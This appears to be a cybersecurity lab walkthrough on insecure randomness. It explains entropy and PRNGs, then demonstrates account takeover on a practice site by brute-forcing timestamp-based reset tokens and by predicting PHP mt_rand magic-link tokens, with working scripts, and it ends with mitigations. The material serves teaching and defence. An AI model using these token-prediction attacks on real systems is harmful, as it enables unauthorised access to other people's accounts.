Insecure randomness occurs when web applications use predictable or poorly generated random values, making them vulnerable to attacks. While randomness is essential for securing tokens, session IDs, and cryptographic keys, insecure implementation can allow attackers to exploit these predictable values to bypass authentication, hijack sessions, or even decrypt sensitive data.

## Randomness

Randomness refers to the lack of pattern or predictability in data, making it an essential component in secure systems.
In cryptography, true randomness ensures an attacker cannot predict values such as keys, tokens, and nonces. We will explore how randomness is generated and the distinction between True Random Number Generators (TRNG) and Pseudorandom Number Generators (PRNG).

## Entropy

Entropy represents the amount of randomness or unpredictability in a system and is often used to assess the security of cryptographic keys, tokens, or random values. Higher entropy indicates greater uncertainty, making it more difficult for attackers to predict or guess the values, which is essential for secure cryptographic operations. Low entropy can lead to weak security, increasing the risk of attacks like brute-forcing or token prediction. 

## Cryptographic Keys

Cryptographic keys are secret values used in algorithms to encrypt and decrypt data, ensuring confidentiality, integrity, and authentication. They are critical components in symmetric and asymmetric encryption methods and must be securely generated and managed to prevent unauthorised access. The strength of a cryptographic key depends on its length and randomness. 

## Session Tokens and Unique Identifiers

Session tokens and unique identifiers are used to maintain user sessions and track interactions in web applications. They must be securely generated with sufficient randomness and uniqueness to prevent token prediction and session hijacking. Proper management and protection of these tokens are essential to ensure secure user authentication and authorisation.

## Seeding

Seeding refers to providing an initial value, known as a seed, to a secure cryptographic function to generate a sequence of random-looking numbers. While these secure functions produce numbers that appear random, the sequence is entirely determined by the seed, meaning the same seed will always result in the same sequence.

# Types of Random Number Generators
## True Random Number Generator (TRNG)

TRNGs generate randomness by relying on unpredictable physical phenomena like thermal noise or radioactive decay. Since these generators stem from natural events, they produce inherently random values. TRNGs are commonly used in highly sensitive cryptographic operations, such as generating the keys for algorithms like RSA or ECC. These keys are then used in tasks like encryption, digital signatures, and certificate creation, where unpredictability is crucial for security. However, TRNGs require specialised hardware and can be slower than other RNGs, making them less suitable for tasks requiring rapid number generation.

![An image showing the true random number generator process starting from a Seed value and how it generated true random numbers.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1736933314835.svg)

As shown in the above figure, the basic workflow includes capturing a seeding value from a natural, unpredictable physical source. This value is then fed into hardware that performs a non-deterministic transformation to generate a sequence of truly random, unpredictable numbers. The output of TRNGs cannot be predicted or reproduced, making them ideal for high-security cryptographic operations.

## Pseudorandom Number Generator (PRNG)

PRNGs, unlike TRNGs, generate random numbers algorithmically based on an initial seed value. While they may appear random, they are deterministic, meaning the same seed will always produce the same sequence of numbers. PRNGs are faster and more efficient than TRNGs and are suitable for applications that quickly need large quantities of random numbers, like simulations or gaming. However, since they are algorithmic, predictability becomes a risk if an attacker can deduce the seed or its generation method.

We will examine the two primary types of PRNGs, statistical and cryptographic PRNGs, focusing on their differences and specific applications.

**Statistical PRNG**

Statistical PRNGs are designed to produce numbers that pass statistical randomness tests, meaning the numbers appear random and lack obvious patterns. These generators are widely used in non-security applications such as simulations, statistical sampling, and gaming, where randomness is required but not in a security-critical context. However, statistical PRNGs are deterministic by nature, meaning the same seed value will always produce the same sequence of numbers. This predictability makes them unsuitable for cryptographic tasks where unpredictability is paramount. 

**Cryptographically Secure PRNG (CSPRNG)**

A CSPRNG is a form of PRNG designed for cryptographic purposes, where randomness must be unpredictable and resistant to attack. Unlike statistical PRNGs, CSPRNGs produce computationally infeasible outputs to reverse-engineer, even if some of the output or internal state is known. CSPRNGs are critical in security-sensitive applications, including encryption key generation, session tokens, and secure random number generation for protocols. These generators must meet stringent requirements to ensure their output cannot be predicted, providing strong protection against cryptographic attacks. While they may be slower than statistical PRNGs due to additional security measures, they are essential for ensuring the integrity and security of cryptographic operations.

# Weak or Insufficient Entropy
This technique will cover a scenario where random number generation suffers from poor or insufficient entropy. As discussed earlier, entropy refers to the unpredictability or randomness in a system, often derived from sources like environmental factors (e.g., hardware noise or user interactions). When these entropy sources are weak or insufficient, the generated random values are not truly random and become vulnerable to attacks.

For example, if an encryption key is generated using low-entropy data, such as a `timestamp`, an attacker could use this predictable information to reduce the complexity of finding the key. Similarly, poor entropy sources, like `system clocks` or `predictable user inputs`, can lead to weak randomness in applications.

## Practical Scenario

In this scenario, an attacker can exploit the predictability of the entropy source to determine the values produced by the random number generator. We will see how weak entropy in token generation leads to security vulnerabilities. We will be using a vulnerable web app hosted on `http://random.thm:8090/case/`. There is also a mail server configured on `http://random.thm:8090/mail/` where the user will receive emails to reset passwords or log in with a magic link.

The website provides a login feature and an option for users who have forgotten their password to request a reset link. In this case, the user with username `victim` has forgotten their password, and our goal is to understand how password reset tokens are generated and then use the knowledge to achieve account takeover for other users. Follow the instructions below to observe the problem first and understand why this approach is insecure.

- Start by visiting the site at `http://random.thm:8090/case/forget_password.php`. Enter the username `victim` in the textbox and click on `Send Reset Link`.
- Next, you will see a message indicating that an email containing a password reset link has been sent.
- Let’s break down the server-side logic that produced this token. Below is the code responsible for generating the reset token:
```javascript
$stmt = $db->prepare("SELECT * FROM users WHERE username = :username");

        $stmt->execute([':username' => $user_id]);

        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user) {

	    $token = $user_id . time();
            $update = $db->prepare("UPDATE users SET reset_token = :token WHERE username = :username");
```
- This token is a simple concatenation of the username (in this case, victim) and the current timestamp produced by the `time()` function.
- Open the [mailbox](http://random.thm:8090/mail/) by logging in with the email `victim@mail.random.thm` and password `Testing@123`. You will see the password reset email like this:
- On the surface, this may seem like a convenient way to generate unique tokens for each password reset request. However, it introduces significant security weaknesses.

## Exploitation

- An attacker can exploit the weak entropy in the reset token by visiting the following reset link: `http://random.thm:8090/case/reset_password.php?token={Username}{timestamp_of_token_generation}`[](http://random.thm:8090/reset_password.php?token={Username}victim{timestamp_of).
- Since the token is generated by concatenating the username with the result of the `time()` function, the attacker knows that the `time()` value represents the timestamp when the reset link was created. With this knowledge, the attacker can perform brute force attacks by guessing nearby timestamps, either manually by trying timestamps a few seconds before and after the reset request or through automation using a script.
- Below is a Python script that accepts command-line arguments for the username and timestamp and brute-forces the reset token by attempting timestamps within 5 minutes before the provided timestamp. [This](https://www.unixtimestamp.com/) website can be used to get the current UNIX timestamp.
- You can adjust the time range by changing `-300` to any other value (in seconds) to avoid waiting too long or testing a more specific time window. For example, `-600` will try tokens within a range of `-10` minutes instead of `5`.
```python
import requests
import sys

# Function to brute force the reset token
def brute_force_token(username, start_timestamp):
    url = "URL"
    
    # Try tokens within a range of -5 minutes
    for i in range(-300, 0): # 300 indicates 5 minutes
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        # Check if the token is valid
        if "Invalid or expired token." not in response.text:
            print(f"Correct token identified: {token}")
            return token
        else:
            print(f"Tried token: {token} (Invalid)")
    
    print("No valid token found in the given range.")
    return None

if len(sys.argv) != 3:
    print("Usage: python exploit.py <username> <unix_timestamp>")
    sys.exit(1)

username = sys.argv[1]
start_timestamp = int(sys.argv[2])

brute_force_token(username, start_timestamp)
```

- Start the AttackBox by clicking on the Start AttackBox button at the top of the page.  Let's create some Python code on our `AttackBox` that would bruteforce the password reset system.
- Once you have created and saved the Python code in the AttackBox, navigate to the web app with the forget password feature to reset the link for the user victim. Once the reset link is generated, visit the website [https://www.unixtimestamp.com/](https://www.unixtimestamp.com/) to note down the current timestamp, let's say (`1726645297`).
- In the AttackBox, open the terminal and enter the following command to identify the exact token sent to the victim user:
```shell-session
python3 exploit.py victim 1726645297
Tried token: victim1726644808 (Invalid)
Tried token: victim1726644809 (Invalid)
Tried token: victim1726644810 (Invalid)
Tried token: victim1726644811 (Invalid)
Tried token: victim1726644812 (Invalid)
Correct token identified: victim1726644813
```
**Why the Token is Weak**

- **Weak Entropy in Token Generation**: In this case, the system relies on low-entropy sources (`username` and `timestamp`), which makes the token predictable. High-entropy tokens are typically generated using secure random number generators (e.g., `random_bytes()`) that produce values with a high degree of unpredictability. Using predictable sources like `time()` does not provide sufficient entropy, making it easy for an attacker to narrow down possible token values. Even though the timestamp changes every second, this predictable increment does not contribute to strong entropy. An attacker could run a brute-force attack using known timestamps within a specific time window (such as within a minute or two from when the token was generated).
- **Small Search Space**: The second major weakness comes from the limited `search space`. A search space refers to the total number of possible values a token could take. A larger search space makes it exponentially harder for attackers to guess or brute-force the correct token. However, in this case, because the `time()` function updates every second, the search space for brute-forcing the token is very small. An attacker could simply guess all possible timestamps within a short time range, say within the last 5 or 10 minutes.

# Predictable Seed in PRNGs
In this task, the focus shifts to cases where a **predictable seed** is used to initialise PRNGs. If the seed is weak or predictable, an attacker can reproduce the entire sequence of random numbers, leading to severe vulnerabilities in systems that rely on these **random** values.

An example of the impact of predictable seeding is in `CAPTCHA` systems, where the random value determining the CAPTCHA challenge will be generated to detect a bot activity. If the seed used to initialise the PRNG is predictable, an attacker could predict the CAPTCHA values ahead of time, allowing them to bypass the CAPTCHA and access restricted areas of the application without solving it.

This issue also manifests in systems like lottery or game applications, where PRNGs determine the outcome of random draws. When these generators are seeded with predictable values, such as timestamps, attackers can manipulate the system by predicting the outcome, ensuring they win consistently. By exploiting the predictable PRNG seed, the attacker can reverse-engineer or replicate the same random sequence, breaking the system's fairness.

## Practical Scenario

In this scenario, we will explore how using predictable seeds to generate tokens in a magic link login system can lead to account takeover. The magic link token is generated using PHP's [mt_rand()](https://www.php.net/manual/en/function.mt-rand.php) function, which is seeded with a combination of the CRC32 value of the user’s email address and a random constant. By analysing the token generation process, an attacker can reverse-engineer the seed and predict valid tokens.

**Analysis of Magic Link Feature**

- Start by navigating the web application at [http://random.thm:8090/case/](http://random.thm:8090/case/) and click `Login with Magic Link`.
- The website allows users to log in through a magic link sent to their email. For this demonstration, use the email: `magic@mail.random.thm`. Enter this email address into the provided input field and click `Send Magic Link`.
- After submitting your email, you will see a message indicating that a magic link has been sent to your email. The magic link contains a token allowing users to log in without entering a password.
- Open the [mailbox](http://random.thm:8090/mail/) by logging in with the email `magic@mail.random.thm` and password `Testing@123`. You will see the **Login with Magic Link** email like this:
- In the victim's inbox, you will see the magic link email. The magic link will look like this:
```python
http://random.thm:8090/case/magic_link_login.php?token=MTEzNTUwODU0MQ==
```
- The token (`MTEzNTUwODU0MQ==`) is a base64-encoded version of a random number generated using PHP’s `mt_rand()` function.
**Analysis of Server Side Code**

Now that we have captured the magic link token from the victim’s email, it's essential to understand how this token was generated on the server. The server uses the PHP’s `mt_rand()` function to generate a random number that forms the basis of the token. Below is the server-side code that generates the token:

```python
mt_srand(CONSTANT_VALUE + crc32($email));

$random_number = mt_rand();
$token = base64_encode($random_number);
```

- When a user requests a magic link, the server first seeds the random number generator (`mt_rand()`) using a combination of dynamic values. The seed is determined by the CRC32 value of the user’s email address plus the constant value. These two elements are combined to form a seed passed to the `mt_srand()` function, initialising PHP’s `mt_rand()` pseudorandom number generator.  
    
- Once the seed is set, the server generates a random number using `mt_rand()`. This random number is then base64-encoded to create the token embedded in the magic link sent to the user’s email.
- The use of PHP’s `mt_rand()` function weakens the security of the system. `mt_rand()` is a pseudorandom number generator, which means that its output is entirely determined by the seed. Once the seed is known, all subsequent outputs of `mt_rand()` can be predicted. Unlike cryptographically secure random number generators, which use entropy from unpredictable sources, `mt_rand()` is deterministic and vulnerable to reverse engineering.

**Decoding the Token**

To proceed with the attack, we need to decode the Base64 token and retrieve the original random number generated by the server. This number is the direct output of PHP’s `mt_rand()` function, which was seeded with a predictable value. You can use an online tool like [Base64 Decode](https://www.base64decode.org/) to quickly decode the token. Simply paste the Base64-encoded token (`MTEzNTUwODU0MQ==`) into the input field, and the decoded output will be displayed.

Once we have decoded the Base64 string, we are left with the original random number generated by mt_rand(), which, in our case, is `1135508541`. This number is crucial for the next step in the attack, as it is the output of a PRNG that was seeded using a dynamic value.  

## Exploitation

The primary tool we’ll use to exploit this vulnerability is [php_mt_seed](https://www.openwall.com/php_mt_seed/). This tool is specifically designed to crack the seed of PHP’s `mt_rand()` function based on the outputs of the random number generator. Once you provide `php_mt_seed` with a `mt_rand()` output, it calculates possible seed values that could have produced that output. You can learn detailed technical explanations and maths about the tool [here](https://www.ambionics.io/blog/php-mt-rand-prediction).

An updated version of `php_mt_seed` is already available on your AttackBox inside the `~/Rooms/InsecureRandomness` directory. If you are not using AttackBox, you can download the original version from [here](https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz). 

The next step with the tool setup is to crack the seed based on the decoded random number from the token. We know that the decoded random number from the base64 token was `1135508541`. This number is the direct output of `mt_rand()`. To find the seed, run the following command in the AttackBox, which takes a little over 5 minutes to show the result (You can skip it as well):
```shell-session
./php_mt_seed 1135508541
Pattern: EXACT
Version: 3.0.7 to 5.2.0
Found 0, trying 0xfc000000 - 0xffffffff, speed 7165.9 Mseeds/s  
Version: 5.2.1+
Found 0, trying 0x30000000 - 0x31ffffff, speed 58.7 Mseeds/s 
seed = 0x318ff649 = 831518281 (PHP 7.1.0+)
Found 1, trying 0x38000000 - 0x39ffffff, speed 58.8 Mseeds/s 
seed = 0x39dc3504 = 970732804 (PHP 7.1.0+)
Found 2, trying 0x6c000000 - 0x6dffffff, speed 56.0 Mseeds/s 
seed = 0x6d8817a7 = 1837635495 (PHP 7.1.0+)
seed = 0x6d8817a7 = 1837635495 (PHP 7.1.0+)
Found 4, trying 0xbe000000 - 0xbfffffff, speed 47.2 Mseeds/s 
seed = 0xbe3249b3 = 3190966707 (PHP 7.1.0+)
Found 5, trying 0xfe000000 - 0xffffffff, speed 44.9 Mseeds/s 
Found 5
```
`php_mt_seed` will output a list of possible seeds that could have generated the random number `1135508541`. This may take up to a few minutes, depending on the range of possible seeds. When using `php_mt_seed`, the tool generates multiple possible seeds because different seeds can produce the same initial random number. This happens due to the way `mt_rand()` is initialised. To accurately identify the correct seed, each one must be tested in the environment individually. In our case, the random number `1135508541` was generated through the seed `970732804`.

Once you have identified the correct seed, you can identify the constant value that the server used to prepare the seed. All you need to do is subtract the CRC32 value of `magic@mail.random.thm` from the identified seed. You can use this [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=CRC-32_Checksum\(\)From_Base\(16\)&ienc=65001&oeol=VT) to get the exact value.
after getting the CRC32 value `970731467`, if we subtract it from the identified seed value `970732804`, we will get the constant value, which is `1337` in this case. 

An attacker only needs the target’s email address to log in as someone else. Once they have the email, the attacker can calculate the CRC32 of the email, add `1337` to it, and use the resulting seed with `mt_srand()`. This allows the attacker to predict the exact token generated for the target, enabling them to bypass authentication and log in as that user without knowing the password. 

In the AttackBox copy and paste the following PHP code to a file called `magic_link_login.php` and then use the command `php -S 0.0.0.0:8181` to utilise PHP's built-in web server for us to access the script. The script will generate 10 tokens based on a seed comprising a constant value and an email address. The script will accept the constant value and email as input and generate the corresponding tokens. To use the script, simply navigate to the following URL with your desired parameters `http://ATTACKBOX_IP:8181/magic_link_login.php?email={email}&constant={constant}`:
```php
<?php
if (isset($_GET['email']) && isset($_GET['constant']) && is_numeric($_GET['constant'])) {
    $email = $_GET['email'];
    $constant = (int)$_GET['constant']; 

    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $seed = crc32($email) + $constant;
        mt_srand($seed);

        echo "<h3>Predicted Magic Link Tokens for $email</h3>";
        for ($i = 0; $i < 10; $i++) {
            $random_number = mt_rand();
          
            $token = base64_encode($random_number);
            echo "Predicted magic link token " . ($i + 1) . ": " . $token . "<br>";
        }
    } else {
      
        echo "<div style='color:red;'>Invalid email format. Please provide a valid email.</div>";
    }
} else {
    echo "<div style='color:red;'>Please provide valid GET parameters: 'email' (valid email address) and 'constant' (numeric value).</div>";
}
?>
```
Now that you have the predicted token, you can log in as the target user. Simply visit the magic link URL [http://random.thm:8090/case/magic_link_login.php?token={predicted_token}](http://random.thm:8090/case/magic_link_login.php?token={predicted_token})  with the predicted token to log in without knowing the password.

# Mitigation Measures
When discussing best practices for identifying and mitigating insecure randomness, it's important to address both pentesters and secure coders, as their perspectives and responsibilities differ. Here's a breakdown of the best practices for each:  

## Pentesters

- **Identify Weak Randomness in Code**: During code reviews or application assessments, look for the use of weak random number generators like `mt_rand()` or `rand()`, especially when they generate security-sensitive values like session tokens or password reset links.
- **Reverse Engineer Predictable Tokens**: Attempt to exploit predictable randomness by reverse-engineering the seed used in PRNGs. Tools like `php_mt_seed` can help pentesters demonstrate how predictable tokens (e.g., magic links) can be recreated. Test for weak or predictable seeds like timestamps, IP addresses, or user-specific values.
- **Test Token Exhaustion**: If Cryptographically Secure Pseudorandom Number Generators (CSPRNGs) are not used, run brute-force or replay attacks against generated tokens, session IDs, or other randomness-dependent features. Ensure that tokens are not guessable or predictable. 

## Secure Code Developers

- **Use Cryptographically Secure PRNGs**: Always use CSPRNGs, such as `random_bytes()` or `openssl_random_pseudo_bytes()` in PHP or `java.security.SecureRandom` in Java. These CSPRNGs are designed to generate unpredictable values suitable for security-critical applications like session tokens, API keys, or password reset tokens. 
- **Avoid Predictable Seed Values**: Never use predictable values like the current `timestamp`, `IP address`, or `process ID` for seeding random number generators. These values can be easily guessed or reverse-engineered by attackers. Instead, use entropy from cryptographic sources or system-provided randomness (e.g., `/dev/urandom` in Linux).
- **Regenerate Randomness for Every Critical Operation**: Avoid reusing random values or seeds across multiple requests or users. Regenerate fresh randomness for each operation that requires secure tokens, such as session management, password resets, or magic links.
- **Use Strong Algorithms for Key Generation**: When generating cryptographic keys, always use secure key generation functions that derive keys from strong sources of entropy. For example, in PHP, you can use `openssl_pkey_new()` for RSA key generation, which relies on secure randomness. 

Through thorough testing techniques and secure coding practices, both pentesters and secure developers can ensure the elimination of vulnerabilities related to insecure randomness.